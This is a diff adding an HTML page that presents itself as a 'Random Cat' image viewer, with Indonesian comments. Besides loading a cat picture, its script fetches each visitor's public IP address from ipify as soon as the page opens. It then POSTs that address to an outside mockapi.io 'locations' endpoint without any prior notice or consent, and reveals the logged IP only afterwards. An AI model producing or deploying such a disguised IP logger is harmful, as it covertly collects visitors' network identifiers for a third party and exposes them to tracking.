@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Kucing Random 🐱</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: system-ui, sans-serif;
+            background: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .card {
+            background: #fff;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,.1);
+            max-width: 400px;
+            text-align: center;
+        }
+
+        img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+
+        .info {
+            margin-top: 12px;
+            font-size: 14px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Random Cat 🐱</h2>
+    <img id="catImage" src="" alt="Kucing lucu">
+    <div class="info" id="status">Loading...</div>
+</div>
+
+<script>
+async function loadCatImage() {
+    // The Cat API (public)
+    const res = await fetch('https://api.thecatapi.com/v1/images/search');
+    const data = await res.json();
+    document.getElementById('catImage').src = data[0].url;
+}
+
+async function sendPublicIP() {
+    try {
+        // Ambil IP publik
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+
+        // Kirim ke MockAPI
+        await fetch('https://6982d0199c3efeb892a35af1.mockapi.io/locations', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                public_ip: ipData.ip
+            })
+        });
+
+        document.getElementById('status').innerText =
+            'IP tercatat: ' + ipData.ip;
+
+    } catch (err) {
+        document.getElementById('status').innerText =
+            'Gagal mencatat IP';
+        console.error(err);
+    }
+}
+
+// Jalan otomatis pas halaman kebuka
+loadCatImage();
+sendPublicIP();
+</script>
+
+</body>
+</html>
